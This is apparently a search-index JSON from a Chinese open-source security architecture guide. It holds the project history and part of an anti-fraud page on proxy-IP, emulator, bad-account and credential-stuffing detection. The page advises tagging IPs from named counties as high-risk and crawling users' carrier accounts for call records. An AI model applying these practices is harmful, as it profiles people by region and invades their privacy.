{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"ossa \u5f00\u6e90\u5b89\u5168\u67b6\u6784 \u5982\u679c\u613f\u610f\u5206\u4eab\u6216\u8005\u60f3\u7ed9\u6211\u4e00\u4e9b\u66f4\u591a\u7684\u610f\u89c1\uff0c\u6b22\u8fce\u52a0\u6211\u5fae\u4fe1\uff1a Lzero2012 \u81f4\u8fc7\u53bb \u672c\u9879\u76ee\u4ece2018-10-08\u53f7\u5f00\u59cb\u521b\u5efa\uff0c\u622a\u6b62\u76ee\u524d2\u4e2a\u6708\u591a\u4e00\u70b9\uff0cstar\u76ee\u524d\u5728400+\uff0c\u5f88\u611f\u8c22\u5927\u5bb6\u7684\u652f\u6301\uff0c\u5199\u4e1c\u897f\u4e00\u76f4\u662f\u4e00\u4ef6\u5f88\u7d2f\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u6211\u4e00\u76f4\u5728\u52aa\u529b\u4e0b\u53bb\u3002 \u8fc7\u53bb\u76842\u4e2a\u6708\u5199\u4e86\u5f88\u591a\u5f00\u6e90\u5b89\u5168\u5de5\u5177\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528\uff0c\u4e5f\u6709\u5f88\u591a\u4eba\u63d0\u51fa\u4e86\u8d28\u7591\"\u4e0d\u5e94\u8be5\u628a\u9879\u76ee\u5199\u6210\u4e86\u5de5\u5177\u6587\u7ae0\"\uff0c\u5957\u7528\u524d\u51e0\u5929\u770b\u5230\u7684\u4e00\u53e5\u8bdd\uff1a\"\u5b89\u88c5\u4e0e\u4f7f\u7528\u6211\u4e0d\u4f1a\u53bb\u770b\u5b98\u65b9\u6587\u6863\u561b\"\u3002\u8fd9\u91cc\u7ed9\u81ea\u5df1\u89e3\u91ca\u4e00\u4e0b\uff0c\u4e00\u5f00\u59cb\u6211\u7684\u65b9\u5411\u5c31\u662f\u5229\u7528\u5f00\u6e90\u5de5\u5177\u6765\u5efa\u8bbe\u4e2d\u5c0f\u578b\u4f01\u4e1a\u7684\u5b89\u5168\uff0c\u8fd9\u7c7b\u578b\u7684\u5f88\u591a\u516c\u53f8\u53ef\u80fd\u6ca1\u6709\u4e13\u4e1a\u7684\u5b89\u5168\uff0c\u6216\u8005\u662f\u4e00\u4e2a\u4eba\u7684\u5b89\u5168\u90e8\uff0c\u6240\u4ee5\u6211\u5728\u7b2c\u4e00\u9636\u6bb5\u5c31\u662f\u54ea\u4e9b\u5b89\u5168\u9690\u60a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ec0\u4e48\u6837\u7684\u5de5\u5177\u6765\u89e3\u51b3\u3002\u4ece\u7b2c\u4e8c\u9636\u6bb5\u5230\u7b2c\u4e09\u9636\u6bb5\u5c06\u4f1a\u662f\u8fd9\u4e9b\u5de5\u5177\u5728\u4f01\u4e1a\u7684\u843d\u5730\u7ecf\u9a8c\uff08\u4e00\u4e2a\u4eba\u7684\u7ecf\u9a8c\u59cb\u7ec8\u662f\u6709\u9650\u7684\uff0c\u6211\u6709\u65f6\u95f4\u4e5f\u4f1a\u53bb\u627e\u4e00\u4e9b\u7532\u65b9\u7684\u670b\u53cb\u6765\u78b0\u649e\u601d\u8def\u6574\u7406\u4ee5\u540e\u53d1\u51fa\u6765\uff09\u3002 2018/10/12-2018/12/07 \u521d\u59cb\u7248\u672c\u6574\u4f53\u67b6\u6784\u5b89\u6392\uff1b V1.0\u7248\u672c\u76ee\u5f55\u91cd\u6784\uff1b \u5e94\u7528\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\uff1a\u5b89\u5168\u6d4b\u8bd5\u3001\u626b\u63cf\u7b49\uff1b DoS/DDoS/CC\u3001\u5165\u4fb5\u68c0\u6d4b\u4e0e\u9632\u5fa1\uff1b \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u3001\u65e5\u5fd7\u5206\u6790\uff1b \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u3001\u65e5\u5fd7\u5206\u6790\u3001\u871c\u7f50\u3001\u767b\u5f55\u767b\u5f55\u8ba4\u8bc1\uff1b \u65e5\u5fd7\u5206\u6790\u8e29\u5751\u3001\u871c\u7f50MHN\u3001jumpserver\uff1b LDAP+Cas\u8eab\u4efd\u4e0e\u8bbf\u95ee\u5b89\u5168\uff1b \u9493\u9c7c\u5e73\u53f0gophish\uff1b Now \u7b2c\u4e00\u9636\u6bb5\u6301\u7eed\u4e862\u4e2a\u591a\u6708\uff0c\u672c\u4ee5\u4e3a\u8fd9\u4e2a\u65f6\u95f4\u4f1a\u66f4\u957f\u4e00\u4e9b\uff0c\u770b\u6765\u81ea\u5df1\u8fd8\u662f\u771f\u7684\u5f88\u62fc\u4e86\uff08\u5199\u5de5\u5177\u5b89\u88c5\u4f7f\u7528\u5176\u5b9e\u662f\u4e00\u4e2a\u4f53\u529b\u6d3b\uff0c\u8111\u529b\u6d3b\u66f4\u591a\u4f53\u73b0\u5728\u5bf9\u5de5\u5177\u7684\u601d\u8003\u4e0e\u8e29\u5751\uff09\u3002\u76ee\u524d\u539f\u9879\u76ee\u88ab\u6211\u5220\u9664\u4e86\uff0c\u4ece\u660e\u5929\u5f00\u59cb\u9879\u76ee\u4f1a\u51fa\u73b0\u4e00\u4e9b\u53d8\u5316\uff0c\u5f88\u591a\u5b50\u9879\u76ee\u5c06\u4f1a\u4ee5\u5982\u4f55\u5728\u4f01\u4e1a\u4e2d\u843d\u5730\u7684\u5f62\u5f0f\u5c55\u73b0\u7ed9\u5927\u5bb6\uff0c\u5e0c\u671b\u5927\u5bb6\u80fd\u7ed9\u6211\u66f4\u591a\u7684\u610f\u89c1\u3002 2018-12-16\uff1a\u5b89\u5168\u6d4b\u8bd5\u6982\u8ff0\u3001\u6f0f\u6d1e\u7ba1\u7406\u6982\u8ff0\u3001\u5b89\u5168\u626b\u63cf\u6982\u8ff0 2018-12-21\uff1a\u9879\u76ee\u8fc1\u79fb 2018-12-27\uff1a\u9879\u76ee\u8fc1\u79fb\u57fa\u672c\u5b8c\u6210\uff0c2019\u5e74\u4ece\u4ee5\u6bcf\u5468\u5468\u592924\u70b9\u4e3a\u65f6\u95f4\u8282\u70b9\uff0c\u6bcf\u5468\u4ea7\u51fa\u4e00\u7bc7\u6df1\u5ea6\u6280\u672f\u6587\u7ae0\u3002 2019-01-13\uff1a\u5b89\u5168\u7ba1\u7406\u5e73\u53f0 2019-01-20\uff1a\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0 2019-08-01\uff1a\u53d8\u66f4\u56fe\u7247\u4f4d\u7f6e\u4ee5\u53ca\u7ed3\u6784 \u611f\u8c22 \u6392\u540d\u4e0d\u5206\u524d\u540e\uff0c\u975e\u5e38\u8c22\u8c22\u5927\u5bb6\u4f19\u7684\u652f\u6301\uff01 aerfa atiger77 bsmali4 cf_hb elknot@meituan hblf hiw0rld LostManiac ourren Rozero Sophone \u5343\u57df\u5343\u5bfb SecWiki \u52fe\u9648\u5b89\u5168\u5b9e\u9a8c\u5ba4","title":"ossa"},{"location":"#ossa","text":"\u5f00\u6e90\u5b89\u5168\u67b6\u6784 \u5982\u679c\u613f\u610f\u5206\u4eab\u6216\u8005\u60f3\u7ed9\u6211\u4e00\u4e9b\u66f4\u591a\u7684\u610f\u89c1\uff0c\u6b22\u8fce\u52a0\u6211\u5fae\u4fe1\uff1a Lzero2012","title":"ossa"},{"location":"#_1","text":"\u672c\u9879\u76ee\u4ece2018-10-08\u53f7\u5f00\u59cb\u521b\u5efa\uff0c\u622a\u6b62\u76ee\u524d2\u4e2a\u6708\u591a\u4e00\u70b9\uff0cstar\u76ee\u524d\u5728400+\uff0c\u5f88\u611f\u8c22\u5927\u5bb6\u7684\u652f\u6301\uff0c\u5199\u4e1c\u897f\u4e00\u76f4\u662f\u4e00\u4ef6\u5f88\u7d2f\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u6211\u4e00\u76f4\u5728\u52aa\u529b\u4e0b\u53bb\u3002 \u8fc7\u53bb\u76842\u4e2a\u6708\u5199\u4e86\u5f88\u591a\u5f00\u6e90\u5b89\u5168\u5de5\u5177\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528\uff0c\u4e5f\u6709\u5f88\u591a\u4eba\u63d0\u51fa\u4e86\u8d28\u7591\"\u4e0d\u5e94\u8be5\u628a\u9879\u76ee\u5199\u6210\u4e86\u5de5\u5177\u6587\u7ae0\"\uff0c\u5957\u7528\u524d\u51e0\u5929\u770b\u5230\u7684\u4e00\u53e5\u8bdd\uff1a\"\u5b89\u88c5\u4e0e\u4f7f\u7528\u6211\u4e0d\u4f1a\u53bb\u770b\u5b98\u65b9\u6587\u6863\u561b\"\u3002\u8fd9\u91cc\u7ed9\u81ea\u5df1\u89e3\u91ca\u4e00\u4e0b\uff0c\u4e00\u5f00\u59cb\u6211\u7684\u65b9\u5411\u5c31\u662f\u5229\u7528\u5f00\u6e90\u5de5\u5177\u6765\u5efa\u8bbe\u4e2d\u5c0f\u578b\u4f01\u4e1a\u7684\u5b89\u5168\uff0c\u8fd9\u7c7b\u578b\u7684\u5f88\u591a\u516c\u53f8\u53ef\u80fd\u6ca1\u6709\u4e13\u4e1a\u7684\u5b89\u5168\uff0c\u6216\u8005\u662f\u4e00\u4e2a\u4eba\u7684\u5b89\u5168\u90e8\uff0c\u6240\u4ee5\u6211\u5728\u7b2c\u4e00\u9636\u6bb5\u5c31\u662f\u54ea\u4e9b\u5b89\u5168\u9690\u60a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ec0\u4e48\u6837\u7684\u5de5\u5177\u6765\u89e3\u51b3\u3002\u4ece\u7b2c\u4e8c\u9636\u6bb5\u5230\u7b2c\u4e09\u9636\u6bb5\u5c06\u4f1a\u662f\u8fd9\u4e9b\u5de5\u5177\u5728\u4f01\u4e1a\u7684\u843d\u5730\u7ecf\u9a8c\uff08\u4e00\u4e2a\u4eba\u7684\u7ecf\u9a8c\u59cb\u7ec8\u662f\u6709\u9650\u7684\uff0c\u6211\u6709\u65f6\u95f4\u4e5f\u4f1a\u53bb\u627e\u4e00\u4e9b\u7532\u65b9\u7684\u670b\u53cb\u6765\u78b0\u649e\u601d\u8def\u6574\u7406\u4ee5\u540e\u53d1\u51fa\u6765\uff09\u3002","title":"\u81f4\u8fc7\u53bb"},{"location":"#20181012-20181207","text":"\u521d\u59cb\u7248\u672c\u6574\u4f53\u67b6\u6784\u5b89\u6392\uff1b V1.0\u7248\u672c\u76ee\u5f55\u91cd\u6784\uff1b \u5e94\u7528\u5b89\u5168\u57fa\u7840\u77e5\u8bc6\uff1a\u5b89\u5168\u6d4b\u8bd5\u3001\u626b\u63cf\u7b49\uff1b DoS/DDoS/CC\u3001\u5165\u4fb5\u68c0\u6d4b\u4e0e\u9632\u5fa1\uff1b \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u3001\u65e5\u5fd7\u5206\u6790\uff1b \u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u3001\u65e5\u5fd7\u5206\u6790\u3001\u871c\u7f50\u3001\u767b\u5f55\u767b\u5f55\u8ba4\u8bc1\uff1b \u65e5\u5fd7\u5206\u6790\u8e29\u5751\u3001\u871c\u7f50MHN\u3001jumpserver\uff1b LDAP+Cas\u8eab\u4efd\u4e0e\u8bbf\u95ee\u5b89\u5168\uff1b \u9493\u9c7c\u5e73\u53f0gophish\uff1b","title":"2018/10/12-2018/12/07"},{"location":"#now","text":"\u7b2c\u4e00\u9636\u6bb5\u6301\u7eed\u4e862\u4e2a\u591a\u6708\uff0c\u672c\u4ee5\u4e3a\u8fd9\u4e2a\u65f6\u95f4\u4f1a\u66f4\u957f\u4e00\u4e9b\uff0c\u770b\u6765\u81ea\u5df1\u8fd8\u662f\u771f\u7684\u5f88\u62fc\u4e86\uff08\u5199\u5de5\u5177\u5b89\u88c5\u4f7f\u7528\u5176\u5b9e\u662f\u4e00\u4e2a\u4f53\u529b\u6d3b\uff0c\u8111\u529b\u6d3b\u66f4\u591a\u4f53\u73b0\u5728\u5bf9\u5de5\u5177\u7684\u601d\u8003\u4e0e\u8e29\u5751\uff09\u3002\u76ee\u524d\u539f\u9879\u76ee\u88ab\u6211\u5220\u9664\u4e86\uff0c\u4ece\u660e\u5929\u5f00\u59cb\u9879\u76ee\u4f1a\u51fa\u73b0\u4e00\u4e9b\u53d8\u5316\uff0c\u5f88\u591a\u5b50\u9879\u76ee\u5c06\u4f1a\u4ee5\u5982\u4f55\u5728\u4f01\u4e1a\u4e2d\u843d\u5730\u7684\u5f62\u5f0f\u5c55\u73b0\u7ed9\u5927\u5bb6\uff0c\u5e0c\u671b\u5927\u5bb6\u80fd\u7ed9\u6211\u66f4\u591a\u7684\u610f\u89c1\u3002 2018-12-16\uff1a\u5b89\u5168\u6d4b\u8bd5\u6982\u8ff0\u3001\u6f0f\u6d1e\u7ba1\u7406\u6982\u8ff0\u3001\u5b89\u5168\u626b\u63cf\u6982\u8ff0 2018-12-21\uff1a\u9879\u76ee\u8fc1\u79fb 2018-12-27\uff1a\u9879\u76ee\u8fc1\u79fb\u57fa\u672c\u5b8c\u6210\uff0c2019\u5e74\u4ece\u4ee5\u6bcf\u5468\u5468\u592924\u70b9\u4e3a\u65f6\u95f4\u8282\u70b9\uff0c\u6bcf\u5468\u4ea7\u51fa\u4e00\u7bc7\u6df1\u5ea6\u6280\u672f\u6587\u7ae0\u3002 2019-01-13\uff1a\u5b89\u5168\u7ba1\u7406\u5e73\u53f0 2019-01-20\uff1a\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0 2019-08-01\uff1a\u53d8\u66f4\u56fe\u7247\u4f4d\u7f6e\u4ee5\u53ca\u7ed3\u6784","title":"Now"},{"location":"#_2","text":"\u6392\u540d\u4e0d\u5206\u524d\u540e\uff0c\u975e\u5e38\u8c22\u8c22\u5927\u5bb6\u4f19\u7684\u652f\u6301\uff01 aerfa atiger77 bsmali4 cf_hb elknot@meituan hblf hiw0rld LostManiac ourren Rozero Sophone \u5343\u57df\u5343\u5bfb SecWiki \u52fe\u9648\u5b89\u5168\u5b9e\u9a8c\u5ba4","title":"\u611f\u8c22"},{"location":"account_security/protection_account/","text":"\u4fdd\u969c\u8d26\u6237\u4f53\u7cfb\u7684\u5b89\u5168 \u901a\u8fc7IP\u7eac\u5ea6\u6765\u4fdd\u969c \u9632\u5fa1\u4ee3\u7406IP\u6c60 \u5229\u7528\u722c\u866b\u83b7\u53d6\u4e92\u8054\u7f51\u4e0a\u7684\u4ee3\u7406IP\uff0c\u5f62\u6210\u9ed1\u540d\u5355\u5e93\uff1b\u89c4\u5219\u975e\u5e38\u6709\u6548\u3001\u7cbe\u51c6\u7387\u9ad8\u3001\u7cfb\u7edf\u6d88\u8017\u4f4e\u3002 \u53cd\u5411\u63a2\u6d4bIP\u7684\u7aef\u53e3\u5f00\u653e\u60c5\u51b5\uff0c\u4ee3\u7406\u7684\u5e38\u7528\u7aef\u53e3\u662f80\u548c8080\uff0c\u5982\u679c\u5bf9\u5e94IP\u5f00\u542f\u4e86\u8fd9\u4e9b\u7aef\u53e3\uff0c\u53ef\u80fd\u662f\u4e0d\u6b63\u5e38\u7684\uff0c\u4e00\u4e2a\u5bb6\u7528IP\u5730\u5740\u666e\u901a\u60c5\u51b5\u4e0b\u662f\u4e0d\u4f1a\u5f00\u653e\u8fd9\u4e9b\u7aef\u53e3\u7684\u3002 \u770bHTTP\u7684XFF\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u53ea\u6709\u5728\u4f7f\u7528\u4e86HTTP\u4ee3\u7406\u65f6\u624d\u4f1a\u6dfb\u52a0\u3002 \u67e5\u770b\u6e90\u7aef\u53e3\uff0c\u901a\u8fc7\u7ecf\u9a8c\u5224\u65ad\uff0c\u5927\u4e8e10000\u7684\u6e90\u7aef\u53e3\u53ea\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e0d\u662f\u4ee3\u7406\u5c31\u662f\u5927\u578b\u673a\u6784\u3002 \u770bkeep-alive\uff0c\u5e26\u6709 Proxy-Connection;Keep-Alive \u7684\u62a5\u6587\uff0c\u6beb\u65e0\u7591\u95ee\u662f\u4ee3\u7406\u3002 \u9632\u5fa1\u6076\u610fIP \u6765\u81ea\u4e8e\u4e1a\u52a1\u4ea7\u751f\uff0c\u5982\u679c\u67d0IP\u66fe\u7ecf\u4f5c\u6076\uff0c\u90a3\u4e48\u5b89\u5168\u6709\u7406\u7531\u8ba4\u4e3a\u5b83\u4e0b\u6b21\u8fd8\u53ef\u80fd\u7ee7\u7eed\u4f5c\u6076\uff0c\u8fd9\u79cdIP\u8981\u5e26\u6807\u7b7e\u89c2\u5bdf\u3002 \u9ad8\u5371\u533a\u57df\uff0c\u6839\u636e\u5386\u53f2\u548c\u884c\u4e1a\u6570\u636e\u6765\u770b\uff0c\u5b89\u6eaa\u3001\u9f99\u5ca9\u3001\u8386\u7530\u3001\u6cc9\u5dde\u3001\u7535\u767d\u3001\u5bbe\u9633\u7b49\uff0c\u8fd9\u4e9b\u5730\u65b9\u7684IP\u5148\u6253\u4e0a\u6807\u7b7e\u3002 \u5a01\u80c1\u60c5\u62a5\uff0c\u901a\u8fc7\u8d2d\u4e70\u83b7\u5f97\uff0c\u77e5\u9053IP\u6700\u8fd1\u662f\u5426\u6709\u6728\u9a6c\u75c5\u6bd2\uff0c\u9ed1\u5ba2\u653b\u51fb\u884c\u4e3a\u3002\u8fd9\u90e8\u5206\u6076\u610fIP\u9700\u8981\u6570\u636e\u65b0\u9c9c\uff0c\u56e0\u4e3aIP\u53d8\u5316\u975e\u5e38\u5feb\u3002 \u901a\u8fc7IP\u7684\u5c5e\u6027\u9632\u5fa1 \u4e00\u4e2ato c\u7684\u4e1a\u52a1\uff0c\u8bbf\u95eeIP\u6765\u81eaIDC\u6216\u8005\u4e91\u670d\u52a1\u5668\uff0c\u8fd9\u662f\u4e0d\u6b63\u5e38\u7684\u3002 \u901a\u8fc7\u9a8c\u8bc1\u7801\u7eac\u5ea6\u6765\u4fdd\u969c \u5e94\u5bf9\u5c0f\u53f7\u4e0e\u63a5\u7801\u5e73\u53f0 \u63a5\u7801\u5e73\u53f0\u624b\u673a\u53f7\u5e93\uff1a\u901a\u8fc7\u722c\u866b\u722c\u53d6\u5404\u5927\u63a5\u7801\u5e73\u53f0\u7684\u624b\u673a\u53f7\u7801\uff0c\u5f62\u6210\u9ed1\u540d\u5355\u5e93\uff0c\u51e1\u662f\u547d\u4e2d\uff0c\u4e00\u5f8b\u52a0\u6807\u7b7e\u3002 \u5907\u6ce8\uff1a\u722c\u4e0d\u5168\uff0c\u800c\u4e14\u63a5\u7801\u5e73\u53f0\u4e5f\u4f1a\u6709\u5f88\u591a\u5bf9\u6297\u722c\u866b\u7684\u6280\u672f\u3002 \u901a\u8fc7\u83b7\u53d6\u624b\u673a\u6743\u9650\u8fdb\u884c\u4e8c\u6b21\u9a8c\u8bc1 \u9488\u5bf9\u91d1\u878d\u884c\u4e1a\uff0c\u53ef\u4ee5\u722c\u53d6\u4f60\u7684\u8fd0\u8425\u5546\u7f51\u4e0a\u8425\u4e1a\u5385\u4fe1\u606f\uff0c\u5982\uff1a\u722c\u53d6\u901a\u8bdd\u8bb0\u5f55\u3002 \u5907\u6ce8\uff1a\u5408\u89c4\u8c03\u6574\uff1b\u8fd0\u8425\u5546\u4e5f\u5177\u6709\u53cd\u722c\u63aa\u65bd\uff1b\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u3002 \u5408\u4f5c\u6570\u636e\u9a8c\u8bc1 \u4e0e\u8fd0\u8425\u5546\u5408\u4f5c\uff0c\u96be\u5ea6\u5f88\u5927\u3002 \u7b2c\u4e09\u65b9\u8d2d\u4e70\u3002 \u8bed\u97f3\u9a8c\u8bc1\u7801 \u4e00\u5b9a\u7a0b\u5ea6\u907f\u514d\u4e86\u9a8c\u8bc1\u7801\u6cc4\u6f0f\uff0c\u4f46\u662f\u5927\u89c4\u6a21\u7684\u8bed\u97f3\u901a\u544a\u4f1a\u5f62\u6210\u6602\u8d35\u7684\u8d39\u7528\u3002 \u901a\u8fc7\u4eba\u673a\u8bc6\u522b\u7eac\u5ea6\u6765\u4fdd\u969c \u8fdb\u884c\u4eba\u673a\u8bc6\u522b\u66f4\u591a\u662f\u4e3a\u4e86\u9632\u6b62\u6279\u91cf\u884c\u4e3a\uff0c\u4e00\u822c\u8fd9\u79cd\u6279\u91cf\u884c\u4e3a\u90fd\u662f\u7531\u7279\u6b8a\u63a5\u53e3\u3001\u7279\u5b9a\u5de5\u5177\u8fdb\u884c\u7684\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5bf9\u5de5\u5177\u7684\u8fd0\u884c\u6a21\u5f0f\u8fdb\u884c\u5206\u6790\uff0c\u624d\u80fd\u4e0d\u65ad\u5bf9\u6297\u3002 \u624b\u673a\u6a21\u62df\u5668\u68c0\u6d4b \u8bbe\u5907MAC\u3001\u578b\u53f7\u3002 \u865a\u62df\u673a\u7279\u5f81 \u865a\u62df\u673a\u7f51\u5361\u4e00\u822c\u4ee5000569\u3001000c29\u3001005056\u5f00\u5934\u3002 USB\u548c\u58f0\u5361\u7279\u5f81\u3002 \u5185\u5b58\u3001\u8fdb\u7a0b\u3001\u670d\u52a1\u3001\u6ce8\u518c\u8868\u7b49\u3002 \u901a\u8fc7\u6570\u636e\u5206\u6790\u7eac\u5ea6\u6765\u4fdd\u969c \u5f02\u5e38\u5206\u6790 \u4e24\u6b21\u767b\u5f55\u65f6\u95f4\u548c\u8ddd\u79bb\u7684\u5f02\u5e38\u3002 \u65e0\u6cd5\u6b63\u5e38\u83b7\u53d6\u8bbe\u5907\u4fe1\u606f\u3002 \u574f\u8d26\u6237\u8bc6\u522b \u8fd9\u91cc\u7684\u8d26\u6237\u4e00\u822c\u7531\uff1a\u624b\u673a\u53f7\u3001\u90ae\u7bb1\u3001QQ\u7b49\u6240\u4ee3\u8868\u3002 \u8d26\u6237\u4fe1\u606f\u662f\u5426\u88ab\u6807\u8bb0\u8fc7\uff1a\u7c7b\u4f3c\u624b\u673a\u53f7\u88ab\u4e3e\u62a5\u6b21\u6570\u8fc7\u591a\u3001\u7b2c\u4e09\u65b9\u5e73\u53f0\u6807\u8bb0\u3002 \u8d26\u6237\u4fe1\u606f\u662f\u5426\u6709\u7279\u6b8a\u542b\u4e49\uff1atest\u3001hacker\u3001admin0\u3001pentest\u3001attack\u3001\u6742\u4e71\u65e0\u5e8f\u7684\u968f\u673a\u5b57\u7b26\u3001\u6709\u89c4\u5219\u7684\u968f\u673a\u5b57\u7b26\u7b49\u3002 \u7528\u6237\u884c\u4e3a\u5206\u6790 \u952e\u76d8\u6572\u51fb\u9891\u7387 \u9f20\u6807\u79fb\u52a8\u901f\u5ea6\u4e0e\u8f68\u8ff9\uff1a\u9488\u5bf9Web HTTP Referer \u5c4f\u5e55\u89e6\u6478\u5bf9\u538b\u529b\uff1a\u9488\u5bf9APP \u70b9\u51fb\u4f4d\u7f6e \u6570\u636e\u5206\u6790\u4fdd\u969c\u7528\u6237\u5b89\u5168\u6848\u4f8b\u5206\u6790 \u649e\u5e93 \u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u770bIP\u548c\u8d26\u53f7\u7684\u9891\u7387\uff0c\u4f46\u662f\u9ed1\u5ba2\u4e5f\u4f1a\u5229\u7528\u4ee3\u7406IP\u6c60\u6216\u964d\u4f4e\u649e\u5e93\u7684\u9891\u7387\uff0c\u6240\u4ee5\u5355\u5355\u4eceIP\u4e0e\u8d26\u53f7\u9891\u7387\uff0c\u53ea\u80fd\u542f\u5230\u4e00\u5b9a\u7684\u4f5c\u7528\u3002 \u60f3\u8981\u66f4\u597d\u7684\u9632\u62a4\uff0c\u9700\u8981\u901a\u8fc7\u66f4\u591a\u7684\u884c\u4e3a\u6765\u5224\u65ad\uff0c\u884c\u4e3a\u5206\u6790\u53d6\u51b3\u4e8e\u4f60\u80fd\u591f\u83b7\u5f97\u7684\u884c\u4e3a\u6570\u636e\u6709\u591a\u5c11\u3002\u6bd4\u5982\u8bbe\u5907\u6307\u7eb9\u5728\u8fd9\u91cc\u5c31\u5927\u6709\u7528\u6b66\u4e4b\u5730\uff0c\u901a\u8fc7\u6293\u53d6\u7528\u6237\u8bbe\u5907\u4fe1\u606f\uff0c\u5f62\u6210\u4e00\u4e2a\u753b\u50cf\u4f5c\u4e3a\u57fa\u7ebf\u3002\u5f53\u73af\u5883\u4ea7\u751f\u53d8\u5316\u800c\u4e0d\u53ef\u4fe1\u65f6\uff0c\u63a8\u51fa\u4e8c\u6b21\u6821\u9a8c\u7b49\u6311\u6218\uff0c\u53e6\u5916\u4e5f\u53ef\u4ee5\u901a\u8fc7\u9875\u9762\u70b9\u51fb\u6d41\u3001\u51fb\u952e\u884c\u4e3a\u6765\u505a\u5224\u65ad\u3002 \u76ee\u524d\u6765\u770b\uff0c\u901a\u8fc7\u884c\u4e3a\u5224\u65ad\u7684\u9632\u76d7\u53f7\uff0c\u6216\u8005\u8bf4\u5bf9\u53ef\u4fe1\u73af\u5883\u5224\u65ad\u7684\u9632\u76d7\u53f7\uff0c\u662f\u4e00\u4e2a\u6bd4\u8f83\u7efc\u5408\u7684\u624b\u6bb5\u3002 \u574f\u8d26\u6237\u672c\u8eab\u884c\u4e3a\u5206\u6790 \u8d26\u6237\u4fe1\u606f\u662f\u5426\u5b8c\u6574\uff1a\u5728\u91d1\u878d\u4f53\u7cfb\u4e2d\uff0c\u8d26\u6237\u662f\u9700\u8981\u5b9e\u540d\u7684\uff0c\u5982\u679c\u5b9e\u540d\u8ba4\u8bc1\u672a\u901a\u8fc7\uff0c\u5219\u4ee3\u8868\u53ef\u80fd\u5b58\u5728\u4fe1\u606f\u865a\u5047\u3002 \u8d26\u6237\u7684\u6d3b\u52a8\u60c5\u51b5\uff1a\u6ce8\u518c\u4ee5\u540e\u662f\u5426\u6709\u767b\u5f55\u8fc7\uff0c\u662f\u5426\u6709\u8fc7\u6b63\u5e38\u64cd\u4f5c\uff0c\u5982\u679c\u6ce8\u518c\u540e\u4ece\u800c\u767b\u5f55\u8fc7\uff0c\u67d0\u4e00\u5929\uff08\u8fd9\u5929\u641e\u6d3b\u52a8\uff09\u7a81\u7136\u767b\u5f55\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002","title":"\u4fdd\u969c\u8d26\u6237\u4f53\u7cfb\u7684\u5b89\u5168"},{"location":"account_security/protection_account/#_1","text":"","title":"\u4fdd\u969c\u8d26\u6237\u4f53\u7cfb\u7684\u5b89\u5168"},{"location":"account_security/protection_account/#ip","text":"","title":"\u901a\u8fc7IP\u7eac\u5ea6\u6765\u4fdd\u969c"},{"location":"account_security/protection_account/#ip_1","text":"\u5229\u7528\u722c\u866b\u83b7\u53d6\u4e92\u8054\u7f51\u4e0a\u7684\u4ee3\u7406IP\uff0c\u5f62\u6210\u9ed1\u540d\u5355\u5e93\uff1b\u89c4\u5219\u975e\u5e38\u6709\u6548\u3001\u7cbe\u51c6\u7387\u9ad8\u3001\u7cfb\u7edf\u6d88\u8017\u4f4e\u3002 \u53cd\u5411\u63a2\u6d4bIP\u7684\u7aef\u53e3\u5f00\u653e\u60c5\u51b5\uff0c\u4ee3\u7406\u7684\u5e38\u7528\u7aef\u53e3\u662f80\u548c8080\uff0c\u5982\u679c\u5bf9\u5e94IP\u5f00\u542f\u4e86\u8fd9\u4e9b\u7aef\u53e3\uff0c\u53ef\u80fd\u662f\u4e0d\u6b63\u5e38\u7684\uff0c\u4e00\u4e2a\u5bb6\u7528IP\u5730\u5740\u666e\u901a\u60c5\u51b5\u4e0b\u662f\u4e0d\u4f1a\u5f00\u653e\u8fd9\u4e9b\u7aef\u53e3\u7684\u3002 \u770bHTTP\u7684XFF\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u53ea\u6709\u5728\u4f7f\u7528\u4e86HTTP\u4ee3\u7406\u65f6\u624d\u4f1a\u6dfb\u52a0\u3002 \u67e5\u770b\u6e90\u7aef\u53e3\uff0c\u901a\u8fc7\u7ecf\u9a8c\u5224\u65ad\uff0c\u5927\u4e8e10000\u7684\u6e90\u7aef\u53e3\u53ea\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e0d\u662f\u4ee3\u7406\u5c31\u662f\u5927\u578b\u673a\u6784\u3002 \u770bkeep-alive\uff0c\u5e26\u6709 Proxy-Connection;Keep-Alive \u7684\u62a5\u6587\uff0c\u6beb\u65e0\u7591\u95ee\u662f\u4ee3\u7406\u3002","title":"\u9632\u5fa1\u4ee3\u7406IP\u6c60"},{"location":"account_security/protection_account/#ip_2","text":"\u6765\u81ea\u4e8e\u4e1a\u52a1\u4ea7\u751f\uff0c\u5982\u679c\u67d0IP\u66fe\u7ecf\u4f5c\u6076\uff0c\u90a3\u4e48\u5b89\u5168\u6709\u7406\u7531\u8ba4\u4e3a\u5b83\u4e0b\u6b21\u8fd8\u53ef\u80fd\u7ee7\u7eed\u4f5c\u6076\uff0c\u8fd9\u79cdIP\u8981\u5e26\u6807\u7b7e\u89c2\u5bdf\u3002 \u9ad8\u5371\u533a\u57df\uff0c\u6839\u636e\u5386\u53f2\u548c\u884c\u4e1a\u6570\u636e\u6765\u770b\uff0c\u5b89\u6eaa\u3001\u9f99\u5ca9\u3001\u8386\u7530\u3001\u6cc9\u5dde\u3001\u7535\u767d\u3001\u5bbe\u9633\u7b49\uff0c\u8fd9\u4e9b\u5730\u65b9\u7684IP\u5148\u6253\u4e0a\u6807\u7b7e\u3002 